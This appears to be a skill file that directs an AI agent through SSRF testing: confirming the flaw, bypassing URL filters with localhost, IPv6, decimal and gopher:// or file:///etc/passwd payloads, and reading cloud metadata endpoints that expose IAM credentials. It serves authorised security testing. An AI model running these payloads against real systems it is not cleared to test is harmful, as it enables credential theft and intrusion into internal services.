---
name: ssrf
description: Deep-dive SSRF testing — bypass filters, hit cloud metadata, chain to RCE/credential disclosure. Use when a target parameter clearly accepts a URL or hostname.
allowed-tools:
  - http
  - shell
  - file_write
---

# SSRF playbook

You suspect a parameter is being fetched server-side. Confirm it, escalate it, prove impact.

Execution rule: use the actual parameter, callback host, and target URL before running commands.

## 1. Confirm the primitive
Send the HTTP request with the parameter pointing to:
- An out-of-band canary the user provides
- Compare to a control value to confirm the server is doing the fetch

If the canary fires, you have at minimum a blind SSRF.

## 2. Map filter behavior
Probe how the server validates the URL:
- `http://127.0.0.1`, `http://localhost`, `http://0.0.0.0`
- IPv6: `http://[::1]`, `http://[::ffff:127.0.0.1]`
- Decimal/octal: `http://2130706433`, `http://0177.0.0.1`
- DNS rebinding hosts
- Schemes: `gopher://`, `file:///etc/passwd`, `dict://`, `ftp://`
- Redirect chain: a user-controlled URL that 302s to internal target

## 3. Hit cloud metadata
AWS:
```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`.
Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true`.

## 4. Internal service discovery
Sweep common internal ports: `:80`, `:443`, `:6379` (Redis), `:9200` (Elastic), `:8500` (Consul), `:2375` (Docker).

## 5. Prove impact
- Stolen credentials → demonstrate by listing one S3/GCS bucket the role can reach.
- Internal admin panel → fetch a page that's clearly internal.
- Source code / config disclosure → grab one file via `file://` or internal HTTP.

Write a finding with the exact request, the exact response, and the impact you proved. Stop there.
